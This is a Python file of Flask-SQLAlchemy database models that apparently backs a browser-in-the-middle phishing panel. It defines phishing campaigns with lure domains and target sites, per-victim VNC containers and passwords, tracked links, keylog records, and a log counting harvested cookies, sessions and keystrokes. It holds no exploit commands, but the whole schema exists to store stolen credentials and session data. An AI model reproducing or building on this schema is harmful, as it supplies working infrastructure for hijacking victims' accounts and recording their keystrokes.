from datetime import datetime, timezone
from flask_sqlalchemy import SQLAlchemy
from flask_login import UserMixin

db = SQLAlchemy()


class AdminUser(UserMixin, db.Model):
    __tablename__ = "admin_users"
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(256), nullable=False)


class Campaign(db.Model):
    __tablename__ = "campaigns"
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(200), nullable=False)
    domain = db.Column(db.String(200), nullable=False)
    target = db.Column(db.String(500), nullable=False)
    num_users = db.Column(db.Integer, nullable=False, default=1)
    ssl = db.Column(db.Boolean, default=False)
    cert_path = db.Column(db.String(500), default="")
    key_path = db.Column(db.String(500), default="")
    useragent = db.Column(db.String(500), default="")
    custom_param = db.Column(db.String(500), default="")
    export_format = db.Column(db.String(50), default="default")
    redirect = db.Column(db.Boolean, default=False)
    zip_profile = db.Column(db.Boolean, default=True)
    browser = db.Column(db.String(20), default="firefox")
    admin_password = db.Column(db.String(100), default="")
    status = db.Column(db.String(20), default="created")  # created, running, stopped
    page_title = db.Column(db.String(300), default="")
    created_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))

    users = db.relationship("CampaignUser", backref="campaign", lazy=True, cascade="all, delete-orphan")
    links = db.relationship("Link", backref="campaign", lazy=True, cascade="all, delete-orphan")


class CampaignUser(db.Model):
    __tablename__ = "campaign_users"
    id = db.Column(db.Integer, primary_key=True)
    campaign_id = db.Column(db.Integer, db.ForeignKey("campaigns.id"), nullable=False)
    user_num = db.Column(db.Integer, nullable=False)
    vnc_container = db.Column(db.String(100), default="")
    mvnc_container = db.Column(db.String(100), default="")
    vnc_password = db.Column(db.String(100), default="")
    mvnc_password = db.Column(db.String(100), default="")
    vnc_ip = db.Column(db.String(50), default="")
    mvnc_ip = db.Column(db.String(50), default="")
    token = db.Column(db.String(100), default="")
    status = db.Column(db.String(20), default="pending")  # pending, running, disconnected


class Link(db.Model):
    __tablename__ = "links"
    id = db.Column(db.Integer, primary_key=True)
    campaign_id = db.Column(db.Integer, db.ForeignKey("campaigns.id"), nullable=False)
    user_num = db.Column(db.Integer, nullable=False)
    url = db.Column(db.String(500), nullable=False)
    click_count = db.Column(db.Integer, default=0)
    created_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))


class Keylog(db.Model):
    __tablename__ = "keylogs"
    id = db.Column(db.Integer, primary_key=True)
    campaign_id = db.Column(db.Integer, db.ForeignKey("campaigns.id"), nullable=False)
    user_num = db.Column(db.Integer, nullable=False)
    is_mobile = db.Column(db.Boolean, default=False)
    content = db.Column(db.Text, default="")
    updated_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))


class Domain(db.Model):
    __tablename__ = "domains"
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(200), unique=True, nullable=False)
    purpose = db.Column(db.String(20), default="campaign")  # campaign or panel
    ssl_enabled = db.Column(db.Boolean, default=False)
    cert_path = db.Column(db.String(500), default="")
    key_path = db.Column(db.String(500), default="")
    cert_method = db.Column(db.String(20), default="manual")  # manual or letsencrypt
    verified = db.Column(db.Boolean, default=False)
    created_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))


class CollectionLog(db.Model):
    __tablename__ = "collection_log"
    id = db.Column(db.Integer, primary_key=True)
    campaign_id = db.Column(db.Integer, db.ForeignKey("campaigns.id"), nullable=False)
    timestamp = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))
    cookies_count = db.Column(db.Integer, default=0)
    sessions_count = db.Column(db.Integer, default=0)
    keylogs_count = db.Column(db.Integer, default=0)
